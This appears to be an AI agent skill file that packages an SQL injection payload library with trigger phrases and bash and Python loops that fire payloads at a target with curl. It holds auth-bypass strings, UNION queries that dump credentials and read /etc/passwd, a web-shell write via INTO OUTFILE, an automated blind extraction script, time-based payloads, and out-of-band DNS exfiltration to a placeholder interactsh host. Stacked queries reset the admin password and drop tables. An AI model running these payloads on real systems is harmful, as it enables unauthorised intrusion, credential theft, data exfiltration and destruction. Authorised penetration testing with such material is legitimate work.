---
name: payload-sqli
description: "SQL injection payload collection — auth bypass, UNION select, blind boolean, time-based, stacked queries, OOB DNS exfiltration, DBMS-specific payloads (MySQL/PostgreSQL/MSSQL/SQLite/Oracle). Triggers: 'sqli payload', 'sql injection payload', 'auth bypass payload', 'union select payload', 'blind sqli', 'sql injection bypass', 'sqlmap payload', 'sql bypass waf'."
---

# SQL Injection Payloads

Organized payload library by technique and DBMS.

## Phase 1: Authentication Bypass

```bash
TARGET="https://TARGET"

# Classic auth bypass
AUTH_PAYLOADS=(
  "' OR '1'='1"
  "' OR '1'='1'--"
  "' OR '1'='1'/*"
  "' OR 1=1--"
  "' OR 1=1#"
  "' OR 1=1/*"
  "admin'--"
  "admin'#"
  "') OR ('1'='1"
  "') OR ('1'='1'--"
  "' OR 'x'='x"
  "1' OR '1'='1"
  "\" OR \"1\"=\"1"
  "' OR 1-- -"
  " OR 1=1--"
  "' UNION SELECT NULL--"
  "' OR sleep(0)='0"
)

for payload in "${AUTH_PAYLOADS[@]}"; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
  result=$(curl -s -X POST "$TARGET/login" \
    -d "username=$encoded&password=anything" -w "%{http_code}")
  echo "$result $payload"
done | tee /workspace/output/sqli-authbypass.txt
```

## Phase 2: UNION-Based Payloads

```bash
# Column count discovery
for n in $(seq 1 15); do
  payload="' UNION SELECT $(python3 -c "print(','.join(['NULL']*$n))")--"
  result=$(curl -s "$TARGET/?id=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"$payload\"))")")
  echo "$result" | grep -iv "error\|invalid" && echo "COLS: $n" && break
done

# MySQL UNION payloads
UNION_PAYLOADS=(
  "' UNION SELECT 1,2,3--"
  "' UNION SELECT 1,database(),user()--"
  "' UNION SELECT 1,table_name,3 FROM information_schema.tables--"
  "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--"
  "' UNION SELECT 1,group_concat(username,':',password),3 FROM users--"
  "' UNION SELECT 1,load_file('/etc/passwd'),3--"
  "' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/shell.php'-- "
)

# MSSQL UNION payloads
MSSQL_PAYLOADS=(
  "' UNION SELECT 1,2,3--"
  "' UNION SELECT 1,db_name(),system_user--"
  "' UNION SELECT 1,name,3 FROM master.dbo.sysdatabases--"
  "' UNION SELECT 1,table_name,3 FROM information_schema.tables--"
)

for payload in "${UNION_PAYLOADS[@]}"; do
  curl -s "$TARGET/?id=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")"
done | tee /workspace/output/sqli-union.txt
```

## Phase 3: Blind Boolean Payloads

```bash
# MySQL blind
BOOL_PAYLOADS=(
  "' AND 1=1--"           # true
  "' AND 1=2--"           # false
  "' AND substring(version(),1,1)='5'--"
  "' AND substring(database(),1,1)='a'--"
  "' AND (SELECT COUNT(*) FROM users)>0--"
  "' AND ascii(substring((SELECT password FROM users LIMIT 1),1,1))>64--"
)

# Automated blind extraction
python3 - <<'EOF'
import requests, string

target = "https://TARGET/?id="
true_cond = "1"
false_cond = "0"

def inject(payload):
    r = requests.get(target + payload)
    return len(r.text)  # baseline diff

result = ""
for pos in range(1, 50):
    for char in string.printable:
        payload = f"1' AND ascii(substring((SELECT database()),{pos},1))={ord(char)}-- "
        if inject(payload) == inject(true_cond):  # Compare response lengths
            result += char
            print(f"Position {pos}: {result}")
            break
    else:
        break

print(f"Database: {result}")
EOF
```

## Phase 4: Time-Based Blind Payloads

```bash
# MySQL
TIME_PAYLOADS_MYSQL=(
  "' AND sleep(5)--"
  "' AND if(1=1,sleep(5),0)--"
  "' OR sleep(5)--"
  "'; SELECT sleep(5)--"
  "1' AND (SELECT * FROM (SELECT(sleep(5)))a)-- "
  "1 AND sleep(5)"
  "' AND BENCHMARK(10000000,MD5(1))--"
)

# PostgreSQL
TIME_PAYLOADS_PG=(
  "'; SELECT pg_sleep(5)--"
  "' AND 1=(SELECT 1 FROM pg_sleep(5))--"
  "'; copy (select '') to program 'sleep 5'--"
)

# MSSQL
TIME_PAYLOADS_MSSQL=(
  "'; WAITFOR DELAY '0:0:5'--"
  "' IF (1=1) WAITFOR DELAY '0:0:5'--"
)

for payload in "${TIME_PAYLOADS_MYSQL[@]}"; do
  start=$(date +%s)
  curl -s "$TARGET/?id=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")" >/dev/null
  end=$(date +%s)
  diff=$((end-start))
  [ $diff -ge 4 ] && echo "TIME-BASED HIT (${diff}s): $payload"
done | tee /workspace/output/sqli-timebased.txt
```

## Phase 5: OOB & Stacked Queries

```bash
# MySQL OOB DNS exfil
OOB_PAYLOADS=(
  "' UNION SELECT load_file(concat('\\\\\\\\',database(),'.INTERACTSH.COM\\\\share\\\\'))--"
  "' AND load_file(concat(0x5c5c5c5c,(SELECT version()),0x2eINTERACTSH_DOMAIN,0x5c5c))--"
)

# PostgreSQL OOB
PG_OOB=(
  "'; COPY (SELECT '') TO PROGRAM 'nslookup \$(whoami).INTERACTSH'--"
  "; SELECT * FROM dblink('host=INTERACTSH user=test dbname=test','SELECT 1') AS t(i int)--"
)

# MSSQL OOB via xp_dirtree
MSSQL_OOB=(
  "'; exec master..xp_dirtree '//INTERACTSH/a'--"
  "'; exec master..xp_fileexist '//INTERACTSH/a'--"
)

# Stacked queries
STACKED=(
  "'; INSERT INTO users(username,password) VALUES('hacked','hacked')--"
  "'; UPDATE users SET password='hacked' WHERE username='admin'--"
  "'; DROP TABLE users--"
  "'; CREATE USER hacker IDENTIFIED BY 'password'--"
)

echo "OOB/Stacked payload library ready" | tee /workspace/output/sqli-advanced.txt
for p in "${OOB_PAYLOADS[@]}" "${STACKED[@]}"; do echo "$p"; done >> /workspace/output/sqli-advanced.txt
```

## Output

Save to `/workspace/output/`:
- `sqli-authbypass.txt` — auth bypass results
- `sqli-union.txt` — UNION select results
- `sqli-timebased.txt` — time-based confirmed points
- `sqli-advanced.txt` — OOB/stacked payloads

## Next Phase

→ `vuln-sqli` for full SQLi exploitation methodology with sqlmap
